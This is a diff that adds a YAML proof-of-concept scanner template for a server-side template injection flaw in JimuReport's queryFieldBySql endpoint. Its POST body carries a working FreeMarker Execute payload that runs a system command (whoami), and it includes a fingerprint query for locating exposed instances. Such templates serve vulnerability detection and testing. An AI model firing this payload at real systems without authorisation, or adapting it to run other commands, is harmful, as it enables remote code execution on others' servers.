@@ -1,0 +1,30 @@
+id: poc-yaml-jimureport-queryfieldbysql-rce
+info:
+  name: 积木报表queryFieldBySql基于SSTI的任意代码执行漏洞
+  severity: critical
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 积木报表
+  hunter: web.body="积木报表"
+variables:
+  path: 'jmreport/queryFieldBySql
+
+    jeecg-boot/jmreport/queryFieldBySql'
+requests:
+- method: POST
+  path: /{{.path}}
+  headers:
+    Content-Type: application/json;charset=UTF-8
+  data: '{"sql":"select ''result:<#assign ex=\"freemarker.template.utility.Execute\"?new()>
+    ${ex(\"whoami\") }''","dbSource":"","type":"0"}'
+  expression: 'status_code == 200
+
+    && contains(body,"解析成功")
+
+    && contains(body,"fieldName")
+
+    && contains(body,"fieldText")
+
+    '
+transport: http
